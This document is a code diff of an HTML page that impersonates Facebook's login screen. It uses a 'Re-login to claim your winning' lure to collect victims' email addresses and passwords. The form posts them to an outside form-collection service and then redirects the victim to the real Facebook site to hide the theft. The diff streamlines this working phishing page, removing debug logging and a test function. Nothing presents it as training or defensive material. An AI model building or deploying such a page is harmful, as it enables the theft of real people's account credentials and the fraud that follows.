@@ -97,6 +97,31 @@
             color: #8a8d91;
         }
 
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: red;
+            display: none;
+        }
+
+        /* Back to account link style */
+        .back-to-account {
+            display: none;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .back-to-account:hover {
+            text-decoration: underline;
+        }
+
+        /* Translation dropdown */
+        .translate-container {
+            margin-top: 20px;
+        }
+
         /* Responsive design */
         @media (max-width: 500px) {
             .login-container {
@@ -106,13 +131,17 @@
     </style>
 </head>
 <body>
+  
 
     <div class="login-container">
         <!-- Facebook Logo -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+      <p style="color:red">Re-login to claim your winning</p>
+
 
         <!-- Login Form -->
-        <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST" onsubmit="processForm(event)">
+      
+        <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST" onsubmit="redirectToFacebook(event)">
             <input type="email" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
@@ -129,56 +158,20 @@
     </div>
 
     <script>
-        function processForm(event) {
-            event.preventDefault(); // Prevent the default form submission
+        function redirectToFacebook(event) {
+            event.preventDefault();
             const form = document.getElementById('loginForm');
-
-            console.log("Submitting form data..."); // Log form submission
 
             fetch(form.action, {
                 method: form.method,
                 body: new FormData(form)
-            }).then(function (response) {
-                console.log("Response status:", response.status); // Log response status
-                return response.json().then(data => ({ status: response.status, body: data })); // Include body in the result
-            }).then(function (result) {
-                if (result.status !== 200) {
-                    console.error('Error response:', result.body); // Log the error details
-                    throw new Error('Network response was not ok');
-                }
-                // Show alert message
-                alert("We are processing your winning, we shall get back to you");
-
-                // Redirect to Facebook after 5 seconds
-                setTimeout(function () {
-                    window.location.href = "https://www.facebook.com";
-                }, 5000);
+            }).then(function () {
+                // After successful form submission, redirect to Facebook
+                window.location.href = "https://www.facebook.com";
             }).catch(function (error) {
                 console.error('Form submission error:', error);
-                alert("There was an error processing your request. Please try again."); // Optional: Show an error message to the user
             });
         }
-
-        // Test function to verify endpoint
-        function testFetch() {
-            fetch('https://submit-form.com/VlWBYGciz', {
-                method: 'POST',
-                body: JSON.stringify({ test: 'test' }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            }).then(response => {
-                console.log("Test fetch response status:", response.status);
-                return response.json();
-            }).then(data => {
-                console.log("Response data:", data);
-            }).catch(error => {
-                console.error("Test fetch error:", error);
-            });
-        }
-
-        // Call test function on page load
-        window.onload = testFetch;
     </script>
 </body>
 </html>
